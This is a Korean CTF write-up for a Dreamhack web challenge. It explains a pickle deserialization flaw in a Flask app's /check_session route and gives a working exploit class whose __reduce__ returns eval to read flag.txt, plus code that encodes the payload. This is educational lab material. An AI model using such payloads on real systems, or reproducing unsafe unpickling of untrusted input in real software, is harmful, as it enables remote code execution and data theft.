created: 2026-01-31 00:18
category: #web 
link: https://dreamhack.io/wargame/challenges/40

# Write-up
```python
INFO = ['name', 'userid', 'password']

@app.route('/create_session', methods=['GET', 'POST'])
def create_session():
    if request.method == 'GET':
        return render_template('create_session.html')
    elif request.method == 'POST':
        info = {}
        for _ in INFO:
            info[_] = request.form.get(_, '')
        data = base64.b64encode(pickle.dumps(info)).decode('utf8')
        return render_template('create_session.html', data=data)
```
1. 입력 값 `name`, `userid`, `password`에 대해서 객체로 저장
2. pickle로 직렬화
3. base64로 인코딩 후 템플릿에 전달

```python
@app.route('/check_session', methods=['GET', 'POST'])
def check_session():
    if request.method == 'GET':
        return render_template('check_session.html')
    elif request.method == 'POST':
        session = request.form.get('session', '')
        info = pickle.loads(base64.b64decode(session))
        return render_template('check_session.html', info=info)
```
- 입력 값 `session`을 base64 디코딩을 거쳐 pickle로 읽는다. 즉, `/create_session`에서 만들 게 된 객체로 복원

우선 `/create_session`에서 만드는 `info` 객체는 이렇게 되어 있을 것이다.
```python
info = {
	'name': 'some name',
	'userid': 'some userid',
	'passowrd': 'some password'
}
```
- 키에 대한 값이 모두 문자열이다. 

어차피 session 값은 `/create_session`을 통하지 않고도 따로 생성할 수 있어 보인다.

pickle에 대한 취약점을 찾아보니 Class에서 `__reduce__` 함수가 문제가 될 수 있다고 한다. 이는 직렬화될 때 호출되는 데, 나중에 역직렬화될 때 어떻게 복구해야하는지 가이드를 제공하는 역할을 한다. 즉, `__reduce__` 함수의 결과가 역직렬화의 최종 결과가 된다.
보통 다음과 같은 형태로 튜플을 반환한다.
`(실행할 함수, (함수에 전달할 인자들))`
그런데 역직렬화하는 쪽에서는 이를 아무런 검증도 없이 수행한다. 따라서 임의로 시스템 함수를 넣고 직렬화한 값을 전달하면 대상 시스템에서 원하는 함수를 실행시킬 수 있다. 

```python
import pickle
import base64


class ExploitPickle:
    def __reduce__(self):
        cmd = "open('./flag.txt', 'r').read()"
        return eval, (cmd,)


info = {
    "name": ExploitPickle(),
    "userid": ExploitPickle(),
    "password": ExploitPickle(),
}

if __name__ == "__main__":
    print(base64.b64encode(pickle.dumps(info)).decode("utf8"))
```
위 코드와 같이 플래그를 읽어서 반환하도록 `__reduce__` 함수를 구현하였다. 

![[Pasted image 20260131011745.png|700]]
최종적으로 exploit session 값을 입력 후 플래그를 획득할 수 있었다.

# Reference
- https://docs.python.org/3/library/pickle.html
- https://davidhamann.de/2020/04/05/exploiting-python-pickle/
- https://jwcs.tistory.com/86
- https://blockdmask.tistory.com/437